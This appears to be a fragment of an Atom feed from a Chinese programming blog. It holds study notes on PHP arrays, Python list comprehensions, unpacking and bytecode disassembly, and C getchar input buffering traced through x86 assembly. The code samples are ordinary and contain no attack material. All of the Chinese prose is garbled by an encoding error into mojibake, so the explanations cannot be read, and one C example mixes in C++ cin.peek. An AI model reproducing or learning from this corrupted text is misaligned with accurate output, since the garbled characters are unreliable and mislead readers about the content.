56</code>ç›¸å½“äº<code>$arr[13]=56</code></p><p>ä½¿ç”¨<code>unset</code>å‡½æ•°å¯ä»¥å–æ¶ˆé”®å€¼å¯¹æ˜ å°„æ¯”å¦‚<code>unset($arr[5])</code>,æˆ–è€…é”€æ¯ä¸€ä¸ªæ•°ç»„<code>unset($arr)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;php docé˜…è¯»ç¬”è®°0&lt;/h1&gt;
&lt;h2&gt;array&lt;/h2&gt;
&lt;p&gt;æ•°ç»„æ˜¯phpçš„key=&amp;gt;valueæ˜ å°„
keyåªèƒ½æ˜¯&lt;code&gt;integer&lt;/code&gt;å’Œ&lt;code&gt;string&lt;/code&gt;ç±»å‹ï¼Œvalueå¯ä»¥æ˜¯ä»»æ„ç±»å‹&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥keyä¼šæœ‰å¦‚
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>pythonæ–‡æ¡£é˜…è¯»ç¬”è®°2</title>
    <link href="https://prontosil.club/2019/07/30/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02/"/>
    <id>https://prontosil.club/2019/07/30/pythonæ–‡æ¡£é˜…è¯»ç¬”è®°2/</id>
    <published>2019-07-30T14:50:01.000Z</published>
    <updated>2019-07-30T14:51:49.282Z</updated>
    
    <content type="html"><![CDATA[<h1>fluent python reading notes</h1><h2>åˆ—è¡¨æ¨å¯¼å¼</h2><p>æœ€å¸¸è§çš„ä¸€ç§å†™æ³•</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">symboles = <span class="string">'ABC%^&amp;*#@$'</span></span><br><span class="line">beyond_ascii = [ord(s) <span class="keyword">for</span> s <span class="keyword">in</span> symboles <span class="keyword">if</span> ord(s) &gt; <span class="number">40</span>]</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ä¹Ÿå¯ä»¥åŒæ—¶ç”¨<code>filter</code>å’Œ<code>map</code>å‡½æ•°æ¥å®ç°</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beyond_ascii = list(filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">40</span>, map(ord, symboles)))</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure></p><p>mapå‡½æ•°å°†ä¸€ä¸ªå‡½æ•°ä½œç”¨äºlistä¸­çš„æ¯ä¸€ä¸ªå€¼ä¸Šï¼Œfilterä¹Ÿæ˜¯å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå€¼ä½œç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯åªè¿”å›ä¸ºçœŸçš„æ•°å€¼ï¼Œpython3ä¸­æœ€åè¿”å›çš„æ˜¯ä¸€ä¸ªfilterå¯¹è±¡</p><p>æ¯”å¦‚è¿‡æ»¤åˆ—è¡¨ä¸­çš„æ‰€æœ‰å¥‡æ•°</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿‡æ»¤å‡ºåˆ—è¡¨ä¸­çš„æ‰€æœ‰å¥‡æ•°</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">242</span>,<span class="number">45</span>,<span class="number">23</span>,<span class="number">536</span>,<span class="number">1</span>,<span class="number">325</span>,<span class="number">63635</span>,<span class="number">56335</span>]</span><br><span class="line">a_is_odd = list(filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> != <span class="number">0</span>, a))</span><br><span class="line">print(a_is_odd)</span><br></pre></td></tr></table></figure></p><p>å†æ¯”å¦‚è¿‡æ»¤å‡º1~100ä¸­å¹³æ–¹æ ¹æ˜¯æ•´æ•°çš„æ•°å­—æ‰€è°“æ•´æ•°å°±æ˜¯èƒ½æ•´é™¤1çš„æ•°å­—</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¿‡æ»¤å‡º1~100ä¸­å¹³æ–¹æ ¹æ˜¯æ•´æ•°çš„æ•°</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">g_is = list(filter(<span class="keyword">lambda</span> x: math.sqrt(x) % <span class="number">1</span> == <span class="number">0</span>, range(<span class="number">1</span>, <span class="number">101</span>)))</span><br><span class="line">print(g_is)</span><br></pre></td></tr></table></figure></p><h2>è§£åŒ…</h2><p>å¦‚ä¸‹æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¥å¥‡çš„æ —å­ï¼Œ<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pythonè§£åŒ…</span></span><br><span class="line">colors = [<span class="string">'black'</span>, <span class="string">'white'</span>]</span><br><span class="line">sizes = [<span class="string">'S'</span>, <span class="string">'M'</span>, <span class="string">'L'</span>]</span><br><span class="line"><span class="keyword">for</span> tshirt <span class="keyword">in</span> (<span class="string">'%s %s'</span> % (c, s) <span class="keyword">for</span> c <span class="keyword">in</span> colors</span><br><span class="line">                                <span class="keyword">for</span> s <span class="keyword">in</span> sizes):</span><br><span class="line">    print(tshirt)</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œç”¨ä¸€ä¸ª<code>%</code>å°†å…ƒç»„è¿›è¡Œäº†æ‹†åŒ…å¦‚ä½•å¾ˆå¥½åœ°ç†è§£åˆ—è¡¨æ¨å¯¼å¼å‘¢ï¼Ÿ</p><p>ä½ å¯ä»¥å°†å…¶æƒ³è±¡ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œ<code>for c in colors for s in sizes</code> è¿”å›å€¼æ˜¯<code>(c, s)</code> ç”¨ä¸€ä¸ª<code>%</code>æˆåŠŸåœ°å¯¹å…¶è¿›è¡Œäº†æ‹†åŒ…è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼</p><p>ä¸‹é¢è¿™å¹…å›¾åº”è¯¥æ¯”è¾ƒå¥½ç†è§£<img src="/assets/python_dvmmoijlo.png" alt="python"></p><p>ç„¶åå°±æœ‰äº†è¿”å›å€¼<img src="/assets/python0_9np9b5bvn.png" alt="python0"></p><p>å½“ç„¶è¿˜æœ‰è¿™ç§å†™æ³•ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, *rst = range(<span class="number">5</span>)</span><br></pre></td></tr></table></figure></p><h2>é™·é˜±</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>,<span class="number">2</span>, [<span class="number">30</span>, <span class="number">40</span>])</span><br><span class="line">t[<span class="number">2</span>] += [<span class="number">50</span>, <span class="number">60</span>]</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure></p><p>åœ¨ä¸€ä¸ªä¸å¯å˜å¯¹è±¡ä¸­æ’å…¥äº†å¯å˜å¯¹è±¡ï¼</p><p>è™½ç„¶æŠ¥é”™ä½†æ˜¯tçš„å€¼ç¡®å®è¢«ä¿®æ”¹äº†</p><p>å¯¹å…¶è¿›è¡Œåæ±‡ç¼–æˆ–è€…æ˜¯åç¼–è¯‘ï¼šå¾—åˆ°ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">3</span> (<span class="number">30</span>)</span><br><span class="line">              <span class="number">9</span> LOAD_CONST               <span class="number">4</span> (<span class="number">40</span>)</span><br><span class="line">             <span class="number">12</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">15</span> BUILD_TUPLE              <span class="number">3</span></span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">0</span> (t)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">21</span> LOAD_FAST                <span class="number">0</span> (t)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">27</span> DUP_TOP_TWO</span><br><span class="line">             <span class="number">28</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">29</span> LOAD_CONST               <span class="number">5</span> (<span class="number">50</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">6</span> (<span class="number">60</span>)</span><br><span class="line">             <span class="number">35</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">38</span> INPLACE_ADD</span><br><span class="line">             <span class="number">39</span> ROT_THREE</span><br><span class="line">             <span class="number">40</span> STORE_SUBSCR</span><br></pre></td></tr></table></figure></p><p>ä½œè€…æå‡ºçš„ä¸‰ä¸ªæ•™è®­ï¼š</p><ol><li>ä¸è¦æŠŠå¯å˜å¯¹è±¡æ”¾åœ¨å…ƒç»„é‡Œé¢</li><li>å¢é‡èµ‹å€¼ä¸æ˜¯ä¸€ä¸ªåŸå­æ“ä½œ</li><li>æŸ¥çœ‹pythonçš„å­—èŠ‚ç å¹¶ä¸éš¾ï¼Œè€Œä¸”äº†è§£ä»£ç èƒŒåçš„è¿è¡Œæœºåˆ¶å¾ˆæœ‰å¸®åŠ©</li></ol><p>ç„¶åæˆ‘ä»¬å°±æ¥ç ”ç©¶pythonçš„å­—èŠ‚ç </p><h2>pythonå­—èŠ‚ç </h2><h3>å˜é‡</h3><blockquote><p>LOAD_FASTä¸€èˆ¬åŠ è½½å±€éƒ¨å˜é‡çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯»å–å€¼ï¼Œç”¨äºè®¡ç®—æˆ–è€…å‡½æ•°è°ƒç”¨ä¼ å‚ç­‰ã€‚STORE_FASTä¸€èˆ¬ç”¨äºä¿å­˜å€¼åˆ°å±€éƒ¨å˜é‡ã€‚</p></blockquote><p>æ¯”å¦‚ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">61</span>          <span class="number">77</span> LOAD_FAST                <span class="number">0</span> (n)</span><br><span class="line">             <span class="number">80</span> LOAD_FAST                <span class="number">3</span> (p)</span><br><span class="line">             <span class="number">83</span> INPLACE_DIVIDE</span><br><span class="line">             <span class="number">84</span> STORE_FAST               <span class="number">0</span> (n)</span><br></pre></td></tr></table></figure></p><p><code>INPLACE_DIVIDE</code>å°±æ˜¯åŸåœ°é™¤æ³•ï¼Œå…ˆåŠ è½½nï¼Œç„¶ååŠ è½½pï¼Œç„¶åé™¤æ³•ï¼Œç„¶åä¿å­˜ç»“æœ</p><p>å¯¹åº”çš„å°±æ˜¯</p><p><code>n = n/p</code></p><blockquote><p>å¦‚ä½•åŒºåˆ†å‡½æ•°å½¢å‚å’Œå…¶ä»–çš„å±€éƒ¨å˜é‡ï¼Ÿ</p></blockquote><blockquote><p>å½¢å‚æ²¡æœ‰åˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯ä»å‡½æ•°å¼€å§‹åˆ°LOAD_FASTè¯¥å˜é‡çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰çœ‹åˆ°STORE_FASTï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±æ˜¯å‡½æ•°å½¢å‚ã€‚</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">3</span> STORE_FAST               <span class="number">1</span> (local1)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>           <span class="number">6</span> LOAD_FAST                <span class="number">1</span> (local1)</span><br><span class="line">            <span class="number">9</span> PRINT_ITEM</span><br><span class="line">           <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (arg1)</span><br><span class="line">           <span class="number">13</span> PRINT_ITEM</span><br><span class="line">           <span class="number">14</span> PRINT_NEWLINE</span><br><span class="line">           <span class="number">15</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">           <span class="number">18</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œ<code>arg1</code>å°±æ²¡æœ‰<code>STORE_FAST</code>æ‰€ä»¥å¯¹åº”çš„æºä»£ç ä¸ºï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(arg1)</span>:</span></span><br><span class="line">    local1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">print</span> local1, arg1</span><br></pre></td></tr></table></figure></p><h3>å…¨å±€å˜é‡</h3><blockquote><p>LOAD_GLOBALç”¨æ¥åŠ è½½å…¨å±€å˜é‡ï¼ŒåŒ…æ‹¬æŒ‡å®šå‡½æ•°åï¼Œç±»åï¼Œæ¨¡å—åç­‰å…¨å±€ç¬¦å·ã€‚</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="number">101</span>)</span><br><span class="line">            <span class="number">9</span> STORE_GLOBAL             <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">20</span> LOAD_GLOBAL              <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">23</span> PRINT_ITEM</span><br></pre></td></tr></table></figure></p><p>å¯¹åº”çš„pythonä»£ç ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> global1</span><br><span class="line">    global1 = <span class="number">101</span></span><br><span class="line">    <span class="keyword">print</span> global1</span><br></pre></td></tr></table></figure></p><h3>å¸¸ç”¨æ•°æ®ç±»å‹</h3><blockquote><p>BUILD_LISTç”¨äºåˆ›å»ºä¸€ä¸ªlistç»“æ„ã€‚</p></blockquote><p>å¦‚æœæ˜¯ç”¨åˆ—è¡¨æ¨å¯¼å¼å‘¢ï¼Ÿ</p><blockquote><p>BUILD_MAPç”¨äºåˆ›å»ºä¸€ä¸ªç©ºçš„dictã€‚STORE_MAPç”¨äºåˆå§‹åŒ–dictçš„å†…å®¹ã€‚</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'a'</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="string">'1'</span>)</span><br><span class="line">              <span class="number">6</span> BUILD_MAP                <span class="number">1</span></span><br><span class="line">              <span class="number">9</span> STORE_FAST               <span class="number">0</span> (k)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">             <span class="number">15</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></p><h1>å‚è€ƒ</h1><p><a href="https://zhuanlan.zhihu.com/p/45101508" target="_blank" rel="noopener">æ­»ç£•pythonå­—èŠ‚ç -æ‰‹å·¥è¿˜åŸpythonæºç </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;fluent python reading notes&lt;/h1&gt;
&lt;h2&gt;åˆ—è¡¨æ¨å¯¼å¼&lt;/h2&gt;
&lt;p&gt;æœ€å¸¸è§çš„ä¸€ç§å†™æ³•&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
      <category term="pythonå­—èŠ‚ç " scheme="https://prontosil.club/tags/python%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    
      <category term="tricks" scheme="https://prontosil.club/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>Cè¯­è¨€ç¼“å†²åŒº</title>
    <link href="https://prontosil.club/2019/07/30/C%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    <id>https://prontosil.club/2019/07/30/Cè¯­è¨€ç¼“å†²åŒº/</id>
    <published>2019-07-30T14:47:28.000Z</published>
    <updated>2019-07-30T14:48:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1>è°ƒè¯•ä¸€ä¸‹cè¯­è¨€ç¨‹åº</h1><p>è‡ªæˆ‘æ„Ÿè§‰å¾ˆä¹…æ²¡å†™Cè¯­è¨€äº†</p><h2>getcharå‡½æ•°</h2><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">char</span> a = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a is %c\n"</span>, a);</span><br><span class="line"><span class="keyword">char</span> b = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b is %c\n"</span>, b);</span><br><span class="line"><span class="keyword">char</span> c = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c is %c\n"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>getcharå‡½æ•°æ˜¯ä¾æ¬¡ä»ç¼“å†²åŒºä¸­å–å‡ºå­—ç¬¦æ¥ï¼Œä¼šå–èµ°çš„ï¼ï¼</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nihao</span><br><span class="line">a is n</span><br><span class="line">b is i</span><br><span class="line">c is h</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸€è¡Œ<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]) != <span class="number">0</span> &amp;&amp; getchar() == <span class="string">' '</span>; ++i)</span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>)); <span class="comment">//æ•°ç»„ä¸ºéé™åºæ’åˆ—</span></span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¼šè¦æ±‚ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œç”¨æˆ·è¾“å…¥çš„æ•°æ®å°±æ˜¯ä¼šå­˜æ”¾åœ¨ç¼“å†²åŒºå†…ï¼Œç„¶åä¹‹åscanfæ¯æ¬¡è¯»ä¸€ä¸ªæ•°å­—ï¼Œgetcharç´§éšå…¶åè¯»ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„æ—¶å€™å¿…é¡»æ˜¯ä¸€ä¸ªæ•°å­—ä¸€ä¸ªç©ºæ ¼</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br></pre></td></tr></table></figure></p><p>ä¹‹åæŠŠç¼“å†²åŒºçš„å­—ç¬¦è¯»å¹²å‡€</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘è¾“å…¥<code>12 21\n</code></p><p>é‚£ä¹ˆscanfè¯»å®Œ21ä¹‹åï¼Œgetcharå‡½æ•°è¯»<code>\n</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00D52466  je          main+0DEh (0D524AEh)  </span><br><span class="line">00D52468  mov         esi,esp  </span><br><span class="line">00D5246A  call        dword ptr [__imp__getchar (0D5F220h)]   ;å‡½æ•°è¿”å›å€¼å­˜æ”¾åœ¨eaxä¸­ï¼Œåè¿›åˆ¶10ï¼Œä»£è¡¨LF</span><br><span class="line">00D52470  cmp         esi,esp  </span><br><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h  </span><br><span class="line">00D5247A  jne         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure></p><p>å…³é”®æ˜¯è¿™ä¸¤æ¡æŒ‡ä»¤ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥ä¹‹åæ¯”è¾ƒ<code>cmp eax 20h</code>å°±ä¼šè·³å‡ºå¾ªç¯</p><p>ä¹‹åè¿›å…¥é‚£ä¸ªwhileå¾ªç¯</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br><span class="line">00D524AE  mov         esi,esp  </span><br><span class="line">00D524B0  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524B6  cmp         esi,esp  </span><br><span class="line">00D524B8  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524BD  cmp         eax,0Ah  </span><br><span class="line">00D524C0  je          main+119h (0D524E9h)</span><br></pre></td></tr></table></figure></p><p>æ­¤æ—¶ç¼“å†²åŒºå·²ç»æ˜¯ç©ºçš„äº†ï¼Œæ‰€ä»¥ä¼šè¦æ±‚ç”¨æˆ·ç»§ç»­è¾“å…¥æ•°æ®æˆ‘æ­¤æ—¶è¾“å…¥äº† <code>1\n</code>æ‰€ä»¥è°ƒç”¨å®Œ<code>getchar</code>å‡½æ•°ä¹‹åeaxå­˜æ”¾äº†åå…­è¿›åˆ¶çš„49</p><p>é‚£ä¹ˆç¬¬äºŒä¸ªè°ƒç”¨<code>getchar</code>è¯»å–çš„ç»“æœå°±æ˜¯<code>0Ah</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00D524C2  mov         esi,esp  </span><br><span class="line">00D524C4  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524CA  cmp         esi,esp  </span><br><span class="line">00D524CC  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524D1  cmp         eax,0FFFFFFFFh</span><br></pre></td></tr></table></figure></p><p>ç»§ç»­ã€‚æ­¤æ—¶ç¼“å†²åŒºå·²ç»ç©ºäº†</p><p>é‚£ä¹ˆä¼šè¦æ±‚ç”¨æˆ·ç»§ç»­è¾“å…¥æˆ‘åˆè¾“å…¥äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¾ˆæ˜æ˜¾æ­¤æ—¶è¯»å–çš„ç»“æœéç©ºï¼Œæ‰€ä»¥è·³å‡ºwhileå¾ªç¯</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00D524D8  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524DE  cmp         esi,esp  </span><br><span class="line">00D524E0  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524E5  test        eax,eax   ;æ£€æŸ¥eaxæ˜¯å¦ä¸ºç©º</span><br><span class="line">00D524E7  jne         main+11Bh (0D524EBh)  </span><br><span class="line">00D524E9  jmp         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/YrxXMwq.png" alt="eax"></p><h2>é‡åˆ°çš„å°´å°¬</h2><p>å¦‚æœè¦ç¨‹åºçš„å¥å£®æ€§ï¼Œé‚£ä¹ˆç”¨æˆ·å¤šè¾“å…¥ä¸€ä¸ªç©ºæ ¼å°±ä¼šå‡ºé”™ï¼Œå› ä¸ºå¤šè¾“å…¥ä¸€ä¸ªç©ºæ ¼ç¨‹åºå°±ä¸çŸ¥é“åé¢é‚£ä¸ªæ˜¯ä»€ä¹ˆäº†ï¼ŒåŒæ—¶è¿˜æ¶‰åŠåˆ°<code>getchar</code>å‡½æ•°æ¸…ç©ºç¼“å†²åŒºï¼Œé‚£ä¸ªwhileå¾ªç¯çš„å†™æ³•ç¡®å®å¾ˆç»å…¸ï¼Œä½†æ˜¯å°±æ²¡æœ‰è€ƒè™‘è¿‡å¦‚æœç¼“å†²åŒºæœ¬èº«å°±æ˜¯ç©ºçš„å‘¢ï¼Ÿ</p><p>æˆ‘ä¿®æ”¹äº†ä¸€ä¸‹åŸæœ‰çš„ä»£ç ï¼ŒåŠ å…¥äº†<code>cin.peek</code>å‡½æ•°æ¥å¸®åŠ©åˆ¤æ–­</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]);</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">char</span> ch = getchar();</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">' '</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isdigit</span>(<span class="built_in">cin</span>.peek()))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        nums = (int *)realloc(nums, sizeof(int)*(i+1));</span></span><br><span class="line"><span class="comment">//    